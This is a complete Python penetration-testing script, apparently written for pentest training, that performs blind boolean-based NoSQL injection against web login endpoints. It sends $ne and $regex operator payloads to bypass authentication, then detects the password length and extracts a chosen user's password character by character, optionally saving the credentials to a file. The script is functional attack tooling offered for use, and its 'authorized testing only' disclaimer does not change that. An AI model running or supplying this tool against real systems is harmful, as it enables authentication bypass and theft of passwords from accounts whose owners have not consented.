#!/usr/bin/env python3
"""
NoSQL Injection Password Dumper
================================
A penetration testing tool for extracting passwords from NoSQL databases.

Author: dnxploit
References: Hack4u Academy, Claude AI
Purpose: Educational and authorized security testing only
"""

import requests
import string
import argparse
import time
from pwn import log, context

context.log_level = 'info'

VERBOSE = False


def send_payload(url, user_field, pass_field, user_payload, pass_payload):
    """
    Send authentication request with NoSQL injection payloads.
    
    Args:
        url: Target login endpoint
        user_field: Username parameter name
        pass_field: Password parameter name
        user_payload: Username injection payload
        pass_payload: Password injection payload
    
    Returns:
        Response object or None if request fails
    """
    data = {
        user_field: user_payload,
        pass_field: pass_payload
    }
    
    if VERBOSE:
        log.debug(f"Payload: {data}")
    
    try:
        response = requests.post(url, json=data, timeout=10)
        
        if VERBOSE:
            log.debug(f"Status Code: {response.status_code}")
            log.debug(f"Response Length: {len(response.text)} bytes")
            log.debug(f"Response Preview: {response.text[:300]}")
        
        return response
    except requests.exceptions.RequestException as e:
        log.error(f"Request failed: {e}")
        return None


def check_success(response, success_string, error_string, mode):
    """
    Determine if authentication attempt was successful based on detection mode.
    
    Args:
        response: HTTP response object
        success_string: String indicating successful login
        error_string: String indicating failed login
        mode: Detection mode ('success' or 'error')
    
    Returns:
        Boolean indicating if login was successful
    """
    if response is None:
        return False
    
    content = response.text.lower()
    
    if mode == "success":
        result = success_string.lower() in content
        if VERBOSE:
            log.debug(f"Looking for '{success_string}' in response: {result}")
        return result
    else:  # mode == "error"
        result = error_string.lower() not in content
        if VERBOSE:
            log.debug(f"Checking '{error_string}' NOT in response: {result}")
        return result


def test_vulnerability(url, user_field, pass_field, username, success_string, error_string, mode):
    """
    Test if the target is vulnerable to NoSQL injection.
    
    Args:
        url: Target login endpoint
        user_field: Username parameter name
        pass_field: Password parameter name
        username: Target username
        success_string: String indicating successful login
        error_string: String indicating failed login
        mode: Detection mode
    
    Returns:
        Boolean indicating if target appears vulnerable
    """
    log.info("Testing NoSQL injection vulnerability...")
    
    # First, let's see what a normal failed login looks like
    log.info("Baseline test: Checking failed login response")
    response_fail = send_payload(url, user_field, pass_field, username, "wrongpassword123")
    
    # Test 1: Try basic bypass with $ne operator
    log.info("Test 1: Basic $ne bypass")
    pass_payload = {"$ne": ""}
    response_success = send_payload(url, user_field, pass_field, username, pass_payload)
    
    # Smart detection: check if responses are different
    if response_success and response_fail:
        if response_success.text != response_fail.text:
            log.success("Target appears VULNERABLE! Responses differ with NoSQL injection")
            
            # Try to auto-detect success strings
            log.info("")
            log.info("Response analysis:")
            log.info(f"  Failed login response : {response_fail.text[:100]}")
            log.info(f"  Injected login response: {response_success.text[:100]}")
            log.info("")
            
            # Suggest better detection strings
            success_resp_lower = response_success.text.lower()
            common_success_words = ["logged", "welcome", "success", "token", "authenticated", "admin", "user", "dashboard"]
            found_words = [word for word in common_success_words if word in success_resp_lower]
            
            if found_words and mode == "success":
                log.info(f"ðŸ’¡ Suggested --success-string values: {', '.join(found_words)}")
                log.info(f"   Current value: '{success_string}'")
            
            # Check if current detection works
            if check_success(response_success, success_string, error_string, mode):
                log.success("Your current detection strings work correctly!")
                return True
            else:
                log.warning("Injection works BUT your detection strings don't match!")
                log.warning(f"The injection returned: {response_success.text[:150]}")
                
                if found_words:
                    log.info(f"Try using: --success-string \"{found_words[0]}\"")
                
                return False
        else:
            log.warning("Responses are identical - injection might not be working")
    
    # Test 2: Try regex operator
    log.info("Test 2: $regex operator test")
    pass_payload = {"$regex": ".*"}
    response = send_payload(url, user_field, pass_field, username, pass_payload)
    
    if response and check_success(response, success_string, error_string, mode):
        log.success("Target appears VULNERABLE! $regex operator works")
        return True
    else:
        log.warning("Regex test failed")
    
    log.failure("Target does NOT appear vulnerable to NoSQL injection")
    log.info("Possible issues:")
    log.info("  - Detection strings (--success-string or --error-string) might be incorrect")
    log.info("  - Field names might be different (try --user-field and --pass-field)")
    log.info("  - Application might not be using MongoDB or vulnerable NoSQL database")
    log.info("  - Application might have input sanitization")
    
    return False


def detect_password_length(url, user_field, pass_field, username, 
                           max_length, success_string, error_string, mode):
    """
    Detect password length using NoSQL regex injection.
    
    Uses the $regex operator to test password length by trying patterns
    like ^.{n}$ where n is the length being tested.
    
    Args:
        url: Target login endpoint
        user_field: Username parameter name
        pass_field: Password parameter name
        username: Target username
        max_length: Maximum password length to test
        success_string: String indicating successful login
        error_string: String indicating failed login
        mode: Detection mode ('success' or 'error')
    
    Returns:
        Detected password length or None if not found
    """
    progress = log.progress("Detecting password length")
    
    for length in range(1, max_length + 1):
        progress.status(f"Testing length: {length}/{max_length}")
        
        # Regex pattern to match exact length: ^.{length}$
        pass_payload = {"$regex": f"^.{{{length}}}$"}
        
        response = send_payload(url, user_field, pass_field, username, pass_payload)
        
        if check_success(response, success_string, error_string, mode):
            progress.success(f"Password length detected: {length} characters")
            return length
        
        time.sleep(0.1)  # Small delay to avoid hammering the server
    
    progress.failure(f"Password length not found (tested up to {max_length})")
    log.warning("Try increasing --max-length if password might be longer")
    return None


def discover_password(url, user_field, pass_field, username, length, 
                      charset, success_string, error_string, mode, delay):
    """
    Discover password character by character using blind NoSQL injection.
    
    Uses regex patterns to test each character position until the full
    password is reconstructed.
    
    Args:
        url: Target login endpoint
        user_field: Username parameter name
        pass_field: Password parameter name
        username: Target username
        length: Known password length
        charset: Character set to test
        success_string: String indicating successful login
        error_string: String indicating failed login
        mode: Detection mode ('success' or 'error')
        delay: Delay between requests (in seconds)
    """
    password = ""
    progress = log.progress("Extracting password")
    
    for pos in range(length):
        found = False
        current_display = password + '_' * (length - len(password))
        progress.status(f"[{pos + 1}/{length}] {current_display}")
        
        for char in charset:
            # Escape special regex characters
            escaped_char = char
            if char in r'\.^$*+?{}[]()|\-':
                escaped_char = '\\' + char
            
            # Build regex pattern: ^known_chars + current_char
            pattern = f"^{password}{escaped_char}"
            pass_payload = {"$regex": pattern}
            
            if VERBOSE:
                log.debug(f"Testing character '{char}' at position {pos + 1}")
            
            response = send_payload(url, user_field, pass_field, username, pass_payload)
            
            if check_success(response, success_string, error_string, mode):
                password += char
                found = True
                current_display = password + '_' * (length - len(password))
                progress.status(f"[{pos + 1}/{length}] {current_display}")
                log.info(f"Found: '{char}' at position {pos + 1}")
                break
            
            # Rate limiting delay
            if delay > 0:
                time.sleep(delay)
        
        if not found:
            progress.failure(f"Character not found at position {pos + 1}")
            log.warning(f"Partial password recovered: {password}")
            log.info("Character might not be in the provided charset")
            log.info(f"Try expanding --charset to include more characters")
            return None
    
    progress.success(f"Password extracted: {password}")
    return password


def print_banner():
    """Display tool banner with information."""
    banner = """
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘         NoSQL Injection Password Dumper v0.1              â•‘
â•‘              Blind Boolean-Based Extraction               â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    """
    print(banner)


def main():
    """Main execution function."""
    print_banner()
    
    # Argument parser configuration
    parser = argparse.ArgumentParser(
        description="Extract passwords from NoSQL databases",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Basic usage:
    python3 nosqliv2.py --url http://target/login --user admin
  
  With custom detection:
    python3 nosqliv2.py --url http://target/api/auth --user admin \\
        --success-string "Welcome" --check-mode success
  
  With custom field names:
    python3 nosqliv2.py --url http://target/login \\
        --user-field email --pass-field passwd \\
        --user admin@example.com
  
  Debug mode to see responses:
    python3 nosqliv2.py --url http://target/login --user admin --verbose
  
  Skip vulnerability test:
    python3 nosqliv2.py --url http://target/login --user admin --skip-test

âš ï¸  WARNING: Use only on systems you have explicit permission to test!
        """
    )
    
    # Required arguments
    parser.add_argument("--url", required=True,
                        help="Target login endpoint URL")
    parser.add_argument("--user", required=True,
                        help="Target username to extract password for")
    
    # Field configuration
    field_group = parser.add_argument_group('Field Configuration')
    field_group.add_argument("--user-field", default="username",
                            help="Username field name (default: username)")
    field_group.add_argument("--pass-field", default="password",
                            help="Password field name (default: password)")
    
    # Detection configuration
    detection_group = parser.add_argument_group('Detection Configuration')
    detection_group.add_argument("--success-string", default="success",
                                help="Text indicating successful login (default: success)")
    detection_group.add_argument("--error-string", default="error",
                                help="Text indicating login failure (default: error)")
    detection_group.add_argument("--check-mode", choices=["success", "error"],
                                default="success",
                                help="Detection mode: 'success' looks for success string, "
                                     "'error' checks error absence (default: success)")
    
    # Attack configuration
    attack_group = parser.add_argument_group('Attack Configuration')
    attack_group.add_argument("--charset", 
                             default=string.ascii_letters + string.digits + "_-@.!#$%&*",
                             help="Character set for brute force (default: alphanumeric + common symbols)")
    attack_group.add_argument("--max-length", type=int, default=30,
                             help="Maximum password length to test (default: 30)")
    attack_group.add_argument("--delay", type=float, default=0,
                             help="Delay between requests in seconds (default: 0)")
    attack_group.add_argument("--skip-test", action="store_true",
                             help="Skip vulnerability test and go straight to extraction")
    
    # Output configuration
    output_group = parser.add_argument_group('Output Configuration')
    output_group.add_argument("--verbose", "-v", action="store_true",
                             help="Enable verbose output to see request/response details")
    output_group.add_argument("--output", "-o",
                             help="Save extracted credentials to file")
    
    args = parser.parse_args()
    
    # Set global verbose flag
    global VERBOSE
    VERBOSE = args.verbose
    
    if VERBOSE:
        context.log_level = 'debug'
        log.info("Verbose mode enabled")
    
    # Display configuration
    log.info("=" * 60)
    log.info("CONFIGURATION")
    log.info("=" * 60)
    log.info(f"Target URL      : {args.url}")
    log.info(f"Target User     : {args.user}")
    log.info(f"Username Field  : {args.user_field}")
    log.info(f"Password Field  : {args.pass_field}")
    log.info(f"Detection Mode  : {args.check_mode}")
    log.info(f"Success String  : '{args.success_string}'")
    log.info(f"Error String    : '{args.error_string}'")
    log.info(f"Max Length      : {args.max_length}")
    log.info(f"Charset Length  : {len(args.charset)} characters")
    log.info(f"Request Delay   : {args.delay}s")
    log.info("=" * 60)
    log.info("")
    
    # Test vulnerability first (unless skipped)
    if not args.skip_test:
        is_vulnerable = test_vulnerability(
            args.url, args.user_field, args.pass_field, args.user,
            args.success_string, args.error_string, args.check_mode
        )
        
        if not is_vulnerable:
            log.failure("Exiting due to failed vulnerability test")
            log.info("Use --skip-test to bypass this check if you're sure the target is vulnerable")
            return
        
        log.info("")
    else:
        log.warning("Skipping vulnerability test (--skip-test enabled)")
        log.info("")
    
    # Start password extraction
    log.info("=" * 60)
    log.info("STARTING PASSWORD EXTRACTION")
    log.info("=" * 60)
    log.info("")
    
    # Step 1: Detect password length
    length = detect_password_length(
        args.url, args.user_field, args.pass_field, args.user,
        args.max_length, args.success_string, 
        args.error_string, args.check_mode
    )
    
    if not length:
        log.failure("Cannot proceed without password length")
        log.info("Possible solutions:")
        log.info("  - Increase --max-length")
        log.info("  - Check detection strings with --verbose")
        log.info("  - Verify field names with --user-field and --pass-field")
        return
    
    log.info("")
    
    # Step 2: Extract password character by character
    password = discover_password(
        args.url, args.user_field, args.pass_field, args.user,
        length, args.charset, args.success_string, 
        args.error_string, args.check_mode, args.delay
    )
    
    if password:
        # Display results
        log.info("")
        log.info("=" * 60)
        log.info("EXTRACTION COMPLETE")
        log.info("=" * 60)
        log.success(f"Username : {args.user}")
        log.success(f"Password : {password}")
        log.success(f"Length   : {len(password)} characters")
        log.info("=" * 60)
        
        # Save to file if requested
        if args.output:
            try:
                with open(args.output, 'a') as f:
                    f.write(f"{args.user}:{password}\n")
                log.success(f"Credentials saved to: {args.output}")
            except Exception as e:
                log.error(f"Failed to save to file: {e}")
    else:
        log.failure("Password extraction incomplete")


if __name__ == "__main__":
    main()
